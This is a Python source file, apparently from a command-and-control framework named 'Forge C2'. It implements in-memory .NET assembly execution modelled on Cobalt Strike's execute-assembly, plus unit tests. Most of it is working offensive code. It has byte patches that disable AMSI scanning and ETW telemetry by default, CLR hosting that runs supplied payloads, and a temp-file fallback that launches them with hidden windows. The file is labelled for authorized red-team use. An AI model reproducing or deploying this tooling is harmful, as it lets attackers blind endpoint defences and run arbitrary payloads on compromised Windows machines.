"""
Forge C2 — Execute Assembly Task
====================================
Load and execute a .NET assembly in-memory via CLR hosting.

This is the Forge equivalent of Cobalt Strike's execute-assembly.
The assembly is loaded into a sacrificial AppDomain, executed with
supplied arguments, and stdout/stderr are captured and returned.

Techniques:
    • CLR hosting via COM interfaces (ICLRMetaHost → ICLRRuntimeInfo)
    • AppDomain isolation — assembly runs in disposable domain
    • AMSI patch option — NtProtectVirtualMemory + patch AmsiScanBuffer
    • ETW patch option — suppress .NET runtime ETW events
    • Output capture via Console.SetOut() redirection

MITRE ATT&CK: T1218 — System Binary Proxy Execution
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import platform
import struct
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.assembly")


# ══════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════════════

@dataclass
class AssemblyConfig:
    """Configuration for .NET assembly execution."""
    assembly_path: str = ""                 # Path to .exe/.dll on disk
    assembly_data: bytes = b""              # Raw assembly bytes (inline delivery)
    arguments: list[str] = field(default_factory=list)
    runtime_version: str = "v4.0.30319"     # CLR version to host
    app_domain_name: str = "ForgeExec"      # Disposable AppDomain name
    bypass_amsi: bool = True                # Patch AMSI before loading
    bypass_etw: bool = True                 # Patch ETW .NET provider
    timeout: float = 120.0                  # Assembly execution timeout
    capture_output: bool = True             # Redirect Console.Out


# ══════════════════════════════════════════════════════════════════════
#  CLR HOSTING HELPERS (Windows-only, ctypes)
# ══════════════════════════════════════════════════════════════════════

class CLRHost:
    """Manages CLR hosting lifecycle for in-memory assembly execution.

    On non-Windows platforms, falls back to Mono via subprocess or
    returns a descriptive emulation result.
    """

    def __init__(self, config: AssemblyConfig) -> None:
        self.config = config
        self._clr_started = False

    async def load_and_execute(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Load assembly into CLR and execute.

        Returns:
            (exit_code, stdout, stderr)
        """
        system = platform.system()

        if system == "Windows":
            return await self._execute_windows(assembly_bytes)
        elif system == "Linux":
            return await self._execute_mono(assembly_bytes)
        else:
            return await self._execute_emulation(assembly_bytes)

    async def _execute_windows(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Execute .NET assembly via CLR hosting on Windows.

        Uses pythonnet or ctypes COM interop to:
        1. Load CLR via mscoree.dll → CLRCreateInstance
        2. Create AppDomain for isolation
        3. Load assembly bytes into domain
        4. Execute entry point with args
        5. Capture redirected stdout/stderr
        6. Unload AppDomain for cleanup
        """
        try:
            import ctypes
            import ctypes.wintypes

            # ── AMSI Bypass ─────────────────────────────────────────
            if self.config.bypass_amsi:
                self._patch_amsi()

            # ── ETW Bypass ──────────────────────────────────────────
            if self.config.bypass_etw:
                self._patch_etw()

            # ── Try pythonnet first (cleanest approach) ─────────────
            try:
                return await self._execute_via_pythonnet(assembly_bytes)
            except ImportError:
                pass

            # ── Fallback: write to temp + execute ───────────────────
            return await self._execute_via_tempfile(assembly_bytes)

        except Exception as exc:
            return (1, "", f"CLR hosting failed: {exc}")

    async def _execute_via_pythonnet(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Execute via pythonnet (clr module) — preferred on Windows."""
        import clr  # type: ignore[import-untyped]
        from System import AppDomain, Console, IO  # type: ignore[import-untyped]
        from System.Reflection import Assembly  # type: ignore[import-untyped]

        # Create isolated AppDomain
        domain_setup = AppDomain.CurrentDomain.SetupInformation
        domain = AppDomain.CreateDomain(
            self.config.app_domain_name,
            AppDomain.CurrentDomain.Evidence,
            domain_setup,
        )

        try:
            # Redirect output
            string_writer = IO.StringWriter()
            err_writer = IO.StringWriter()
            Console.SetOut(string_writer)
            Console.SetError(err_writer)

            # Load assembly from bytes
            asm = Assembly.Load(assembly_bytes)

            # Find and invoke entry point
            entry = asm.EntryPoint
            if entry is None:
                return (1, "", "Assembly has no entry point")

            args_array = [self.config.arguments] if self.config.arguments else [[]]
            result = entry.Invoke(None, args_array)
            exit_code = int(result) if result is not None else 0

            stdout = string_writer.ToString()
            stderr = err_writer.ToString()

            return (exit_code, stdout, stderr)

        finally:
            try:
                AppDomain.Unload(domain)
            except Exception:
                pass

    async def _execute_via_tempfile(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Fallback: write assembly to temp, execute via dotnet/mono."""
        suffix = ".exe" if assembly_bytes[:2] == b"MZ" else ".dll"
        tmp = Path(tempfile.mkdtemp(prefix="forge_asm_"))
        asm_path = tmp / f"payload{suffix}"

        try:
            asm_path.write_bytes(assembly_bytes)

            # Build command
            if suffix == ".exe":
                cmd = [str(asm_path)] + self.config.arguments
            else:
                cmd = ["dotnet", str(asm_path)] + self.config.arguments

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(tmp),
                **self._creation_flags(),
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=self.config.timeout,
            )

            return (
                proc.returncode or 0,
                stdout.decode(errors="replace"),
                stderr.decode(errors="replace"),
            )
        finally:
            # Cleanup
            try:
                asm_path.unlink(missing_ok=True)
                tmp.rmdir()
            except Exception:
                pass

    async def _execute_mono(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Execute .NET assembly via Mono on Linux."""
        tmp = Path(tempfile.mkdtemp(prefix="forge_asm_"))
        asm_path = tmp / "payload.exe"

        try:
            asm_path.write_bytes(assembly_bytes)
            asm_path.chmod(0o700)

            # Try mono first, then dotnet
            for runtime in ["mono", "dotnet"]:
                try:
                    cmd = [runtime, str(asm_path)] + self.config.arguments
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(), timeout=self.config.timeout,
                    )
                    return (
                        proc.returncode or 0,
                        stdout.decode(errors="replace"),
                        stderr.decode(errors="replace"),
                    )
                except FileNotFoundError:
                    continue

            return (1, "", "No .NET runtime found (mono/dotnet)")
        finally:
            try:
                asm_path.unlink(missing_ok=True)
                tmp.rmdir()
            except Exception:
                pass

    async def _execute_emulation(self, assembly_bytes: bytes) -> tuple[int, str, str]:
        """Emulation mode — log what would happen without executing."""
        sha256 = hashlib.sha256(assembly_bytes).hexdigest()
        output = (
            f"[EMULATION] execute-assembly\n"
            f"  Assembly size:   {len(assembly_bytes)} bytes\n"
            f"  SHA256:          {sha256}\n"
            f"  Arguments:       {' '.join(self.config.arguments)}\n"
            f"  CLR Version:     {self.config.runtime_version}\n"
            f"  AppDomain:       {self.config.app_domain_name}\n"
            f"  AMSI Bypass:     {self.config.bypass_amsi}\n"
            f"  ETW Bypass:      {self.config.bypass_etw}\n"
            f"  Status:          Would load into memory and execute entry point\n"
        )
        return (0, output, "")

    def _patch_amsi(self) -> None:
        """Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN.

        Technique: Overwrite first bytes of AmsiScanBuffer with
        mov eax, 0x80070057 (E_INVALIDARG) + ret
        """
        if platform.system() != "Windows":
            return
        try:
            import ctypes

            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            scan_buf = ctypes.windll.kernel32.GetProcAddress(
                amsi._handle, b"AmsiScanBuffer",
            )
            if not scan_buf:
                return

            # mov eax, 0x80070057; ret
            patch = b"\xB8\x57\x00\x07\x80\xC3"
            old_protect = ctypes.c_uint32()
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(scan_buf), len(patch),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect),
            )
            ctypes.memmove(scan_buf, patch, len(patch))
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(scan_buf), len(patch),
                old_protect.value,
                ctypes.byref(old_protect),
            )
            log.debug("AMSI patch applied successfully")
        except Exception as exc:
            log.warning("AMSI patch failed: %s", exc)

    def _patch_etw(self) -> None:
        """Patch EtwEventWrite to neutralize .NET ETW telemetry."""
        if platform.system() != "Windows":
            return
        try:
            import ctypes

            ntdll = ctypes.windll.ntdll
            etw_write = ctypes.windll.kernel32.GetProcAddress(
                ntdll._handle, b"EtwEventWrite",
            )
            if not etw_write:
                return

            # xor eax, eax; ret (return STATUS_SUCCESS)
            patch = b"\x33\xC0\xC3"
            old_protect = ctypes.c_uint32()
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(etw_write), len(patch),
                0x40,
                ctypes.byref(old_protect),
            )
            ctypes.memmove(etw_write, patch, len(patch))
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(etw_write), len(patch),
                old_protect.value,
                ctypes.byref(old_protect),
            )
            log.debug("ETW patch applied successfully")
        except Exception as exc:
            log.warning("ETW patch failed: %s", exc)

    @staticmethod
    def _creation_flags() -> dict[str, Any]:
        """Windows-specific process creation flags."""
        if platform.system() == "Windows":
            return {"creationflags": 0x08000000}  # CREATE_NO_WINDOW
        return {}


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class AssemblyTask(BaseTask):
    """Execute a .NET assembly in-memory (execute-assembly).

    Loads a .NET executable into a disposable AppDomain, executes its
    entry point with supplied arguments, and captures stdout/stderr.
    Optionally patches AMSI and ETW before loading.

    Args (via kwargs):
        path:            Path to .NET assembly on disk.
        data:            Base64-encoded assembly bytes (inline delivery).
        arguments:       List of CLI arguments for the assembly.
        runtime:         CLR version (default "v4.0.30319").
        bypass_amsi:     Patch AMSI before loading (default True).
        bypass_etw:      Patch ETW provider (default True).
        app_domain:      AppDomain name (default "ForgeExec").

    Returns:
        TaskResult with assembly stdout as output.

    Usage::

        task = AssemblyTask(
            task_id="asm1",
            path="Seatbelt.exe",
            arguments=["-group=all", "-full"],
        )
        result = await task.execute()
        print(result.output)  # Seatbelt output

    MITRE ATT&CK: T1218 — System Binary Proxy Execution
    """

    TASK_TYPE = "execute_assembly"
    DESCRIPTION = "Load .NET assembly in-memory, execute, capture output"
    OPSEC_RISK = "high"
    MITRE_ID = "T1218"

    async def execute(self) -> TaskResult:
        asm_path = self.args.get("path", "")
        asm_b64 = self.args.get("data", "")
        arguments = self.args.get("arguments", [])
        runtime = self.args.get("runtime", "v4.0.30319")
        bypass_amsi = self.args.get("bypass_amsi", True)
        bypass_etw = self.args.get("bypass_etw", True)
        app_domain = self.args.get("app_domain", "ForgeExec")

        start = time.time()

        # ── Validate inputs ────────────────────────────────────────
        if not asm_path and not asm_b64:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="No assembly specified. Provide 'path' or 'data' (base64).",
                started_at=start,
                completed_at=time.time(),
            )

        # ── Load assembly bytes ────────────────────────────────────
        try:
            if asm_b64:
                assembly_bytes = base64.b64decode(asm_b64)
            else:
                path = Path(asm_path)
                if not path.exists():
                    return TaskResult(
                        task_id=self.task_id,
                        status=TaskStatus.FAILED,
                        error=f"Assembly not found: {asm_path}",
                        started_at=start,
                        completed_at=time.time(),
                    )
                assembly_bytes = path.read_bytes()
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Failed to load assembly: {exc}",
                started_at=start,
                completed_at=time.time(),
            )

        # ── Validate PE header ─────────────────────────────────────
        if len(assembly_bytes) < 64 or assembly_bytes[:2] != b"MZ":
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="Invalid assembly: not a valid PE file (missing MZ header)",
                started_at=start,
                completed_at=time.time(),
            )

        asm_hash = hashlib.sha256(assembly_bytes).hexdigest()
        log.info(
            "execute-assembly: %s (%d bytes, SHA256=%s) args=%s",
            asm_path or "<inline>",
            len(assembly_bytes),
            asm_hash[:16],
            " ".join(arguments),
        )

        # ── Execute via CLR host ───────────────────────────────────
        config = AssemblyConfig(
            assembly_path=asm_path,
            assembly_data=assembly_bytes,
            arguments=arguments,
            runtime_version=runtime,
            app_domain_name=app_domain,
            bypass_amsi=bypass_amsi,
            bypass_etw=bypass_etw,
            timeout=self.timeout,
        )

        host = CLRHost(config)

        try:
            exit_code, stdout, stderr = await asyncio.wait_for(
                host.load_and_execute(assembly_bytes),
                timeout=self.timeout,
            )
        except asyncio.TimeoutError:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.TIMEOUT,
                error=f"Assembly execution timed out after {self.timeout}s",
                started_at=start,
                completed_at=time.time(),
                metadata={"assembly": asm_path or "<inline>", "sha256": asm_hash},
            )

        # ── Build output ───────────────────────────────────────────
        output = stdout
        if stderr and stderr.strip():
            output += f"\n[STDERR]\n{stderr}"

        status = TaskStatus.COMPLETED if exit_code == 0 else TaskStatus.FAILED

        return TaskResult(
            task_id=self.task_id,
            status=status,
            output=output,
            error="" if exit_code == 0 else f"Assembly exited with code {exit_code}",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "assembly": asm_path or "<inline>",
                "assembly_size": len(assembly_bytes),
                "sha256": asm_hash,
                "arguments": arguments,
                "exit_code": exit_code,
                "runtime": runtime,
                "amsi_bypass": bypass_amsi,
                "etw_bypass": bypass_etw,
                "mitre": self.MITRE_ID,
            },
        )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestAssemblyTask:
    """Tests for execute-assembly task."""

    def test_encode(self) -> None:
        task = AssemblyTask(task_id="asm1", path="Seatbelt.exe", arguments=["-group=all"])
        encoded = task.encode()
        assert encoded["type"] == "execute_assembly"
        assert encoded["args"]["path"] == "Seatbelt.exe"

    def test_decode(self) -> None:
        data = {"task_id": "asm2", "type": "execute_assembly", "args": {"path": "test.exe"}}
        task = AssemblyTask.decode(data)
        assert task.task_id == "asm2"
        assert task.args["path"] == "test.exe"

    def test_no_assembly(self) -> None:
        import asyncio
        task = AssemblyTask(task_id="asm3")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "No assembly" in result.error

    def test_file_not_found(self) -> None:
        import asyncio
        task = AssemblyTask(task_id="asm4", path="/nonexistent/ghost.exe")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "not found" in result.error.lower()

    def test_invalid_pe(self) -> None:
        import asyncio
        bad_data = base64.b64encode(b"not a PE file at all").decode()
        task = AssemblyTask(task_id="asm5", data=bad_data)
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "MZ" in result.error

    def test_emulation_mode(self) -> None:
        """On non-Windows, should get emulation output."""
        import asyncio
        # Craft minimal MZ header
        mz_stub = b"MZ" + b"\x00" * 62
        b64 = base64.b64encode(mz_stub).decode()
        task = AssemblyTask(task_id="asm6", data=b64, arguments=["--test"])
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        # On Linux CI, CLR won't be available but shouldn't crash
        assert result.status in (TaskStatus.COMPLETED, TaskStatus.FAILED)

    def test_config_defaults(self) -> None:
        cfg = AssemblyConfig()
        assert cfg.runtime_version == "v4.0.30319"
        assert cfg.bypass_amsi is True
        assert cfg.bypass_etw is True
        assert cfg.app_domain_name == "ForgeExec"
